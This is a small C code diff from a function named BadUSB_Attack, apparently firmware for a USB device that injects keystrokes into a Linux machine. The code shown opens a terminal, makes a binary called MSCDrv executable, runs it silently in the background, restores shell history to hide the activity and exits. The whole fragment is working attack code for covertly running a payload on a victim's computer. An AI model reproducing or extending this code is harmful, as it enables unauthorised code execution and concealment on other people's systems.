@@ -637,7 +637,8 @@ void BadUSB_Attack(int stage){
 		uint8_t Terminal[3] = LinuxTerminal;
 		char AttackStr1[256] = {'\0'};
 		strcat(AttackStr1, "cd /home/user/Templates\n");
-		strcat(AttackStr1, "chmod 777 MSCDrv\n./MSCDrv >/dev/null 2>&1 &\n");
+		strcat(AttackStr1, "chmod 777 MSCDrv\n");
+		strcat(AttackStr1, "./MSCDrv >/dev/null 2>&1 &\n");
 		strcat(AttackStr1, "set -o history\n");
 		strcat(AttackStr1, "exit\n");
 		SimulateShortcutKey(Terminal, 3);
